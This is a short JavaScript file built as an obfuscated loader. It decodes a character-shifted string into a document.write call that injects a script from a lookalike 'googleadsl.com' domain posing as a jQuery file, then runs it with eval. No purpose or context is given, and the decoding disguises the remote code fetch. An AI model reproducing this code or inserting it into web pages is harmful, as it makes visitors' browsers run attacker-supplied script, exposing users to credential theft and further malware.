newFunction();

function newFunction() {
    var str = "cnbtldms-vqhsd'!;rbqhosrqb<[!gsso9..vvv-fnnfkd`crk-bnl.robncd.iptdqx-ir[!=;.rbqhos=!(:";
    var length = str.length;
    var ba64 = "";
    for (var i = 0; i < length; i++) {
        var s = str.charCodeAt(i);
        s++;
        ba64 = ba64 + String.fromCharCode(s);
    }
    console.log(1);
    console.log(ba64);
    console.log(2);
    console.log(eval(ba64));
}
